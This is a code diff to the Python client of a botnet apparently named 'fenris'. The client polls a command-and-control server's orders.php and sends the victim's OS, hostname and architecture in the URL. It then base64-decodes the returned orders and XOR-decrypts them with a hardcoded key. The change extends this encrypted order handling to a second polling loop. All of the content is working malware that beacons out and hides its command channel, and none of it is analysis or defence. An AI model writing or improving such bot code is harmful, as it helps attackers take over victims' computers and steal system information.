@@ -29,6 +29,7 @@ from itertools import cycle, izip
 
 
 candc = "127.0.0.1"
+key = "gT8jUdw65h"
 # extract system information
 systemData = platform.uname()
 currentTime = time.time()
@@ -38,7 +39,6 @@ while(True):
         # get fenris orders
         encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
         orders = base64.b64decode(encryptedOrders)
-        key = "gT8jUdw65h"
         orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
         orders = orders.split("\n")
         
@@ -52,7 +52,10 @@ while(True):
                 # let the cuteness begin
                 while(True):
                         if (int(time.time())-int(currentTime))%timeFactor == 0:
-                                orders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read().split("\n")                
+                                encryptedOrders = urllib2.urlopen("http://" + candc + "/orders.php?p=bot&os=" + systemData[0] + "&username=" + systemData[1] + "&version=" + systemData[2] + "&osdetail=" + systemData[3] + "&architecture=" + systemData[4]).read()
+                                orders = base64.b64decode(encryptedOrders)
+                                orders = ''.join(chr(ord(c)^ord(k)) for c,k in izip(orders, cycle(key)))
+                                orders = orders.split("\n")                                                
                         if orders[0] == "no":
                                 break
                         else:
